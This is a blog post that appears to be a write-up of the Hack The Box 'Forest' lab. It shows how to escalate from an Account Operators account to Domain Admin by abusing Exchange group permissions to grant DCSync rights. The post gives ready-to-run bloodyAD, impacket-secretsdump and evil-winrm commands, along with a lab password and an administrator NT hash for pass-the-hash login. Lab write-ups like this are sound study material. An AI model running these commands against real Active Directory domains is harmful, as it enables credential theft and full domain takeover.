---
title: From Account Operators and Exchange Windows Permissions / Exchange Truster Subsystem groups to Domain Admin
description: Abusing the excessive permissions of the Exchange Windows Permissions / Exchange Truster Subsystem groups to grant DCSync.
author: victor_contreras
date: 2026-01-26 11:33:00 +0800
categories: [Active Directory, DACLs]
tags: [Active Directory, DACLs, bloodyAD, impacket-secretsdump]
math: true
mermaid: true
image:
  path: /assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/2026-01-26-Account-Operators-and-Exchange-Windows-Permissions.webp
  alt: Silhouette of Woman Holding Lantern in Night
---

# Summary

{: .mt-4 .mb-0 }

This post shows how to abuse the excessive permissions of the **Exchange Windows Permissions** / **Exchange Truster Subsystem** groups to grant **DCSync** permissions to an account created with a compromised user in the **Account Operators** group.

Base on the [HTB Forest Machine](https://www.hackthebox.com/machines/forest).

## Attack Path

Example attack path from our compromised account to the domain controller from `BloodHound`.

![BloodHound Attack Path](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/Attack_Path.png)

## Key elements of the attack
* In this example we already own/control the `svc-alfresco` domain account.
* We will use the capabilities of the `Account Operators` group to create domain users and manage domain groups.
* We will create a new user and add it to the `Exchange Windows Permissions` group by taking advantage of the `GenericAll` permission.
* Using the `WriteDacl` permission of the `Exchange Windows Permissions`, we will grant our new user `DCSync` permissions to compromise the domain controller.
* Perform a `DCSync` attack to the domain controller with `impacket-secretsdump`.

### Steps

We will use `bloodyAD` to perform create a user, modify a group and permissions.

1.- Create a new domain user:

```bash
bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add user 'evil' 'EvilMachine1!'
```

![Create a new domain user](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/New_User.png)

2.- Add the user to the Exchange group:

```bash
bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add groupMember "Exchange Trusted Subsystem" 'evil'
```

Note for this example: 
> `(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)`

![Add the user to the Exchange group](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/Add_User_to_Group.png)

3.- Grant DCSync permissions to the new user:

```bash
bloodyAD --host 10.129.95.210 -d HTB -u evil -p 'EvilMachine1!' add dcsync evil
```

![Grant DCSync permissions](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/DCSync_Permissions.png)

4.- Perform a DCSync attack to obtain all the credentials from the domain controller:

```bash
impacket-secretsdump HTB/evil:'EvilMachine1!'@10.129.95.210
```

![DCSync attack](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/DCSync_attack.png)

5.- Finally, we can use the NTHash to log in as the administrator using the Windows Remote Management (WinRM) service:

```bash
evil-winrm -i 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

![Administrator NTHash](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/Admin_NTHash.png)

## References

* https://www.hackthebox.com/machines/forest
* https://specterops.io/blog/2024/03/20/pwned-by-the-mail-carrier/
* https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators